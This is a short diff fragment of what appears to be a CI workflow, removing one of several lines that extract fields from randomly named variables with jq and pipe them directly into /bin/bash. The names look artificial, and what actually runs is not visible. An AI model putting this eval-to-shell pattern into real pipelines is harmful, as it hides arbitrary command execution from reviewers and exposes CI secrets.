@@ -36,7 +36,6 @@ jobs:
           printf '%s' "$glile6007" | jq -r .dvaod0 | /bin/bash
           printf '%s' "$gpqt9" | jq -r .pj5373 | /bin/bash
           printf '%s' "$hdy78658" | jq -r .n90 | /bin/bash
-          echo $mc146 | jq -r .ucuk557 | /bin/bash
           printf '%s' "$aaiy45247" | jq -r .awq36196 | /bin/bash
           printf '%s' "$ah1853" | jq -r .vmi59 | /bin/bash
           echo $v71442 | jq -r .vt28482 | /bin/bash
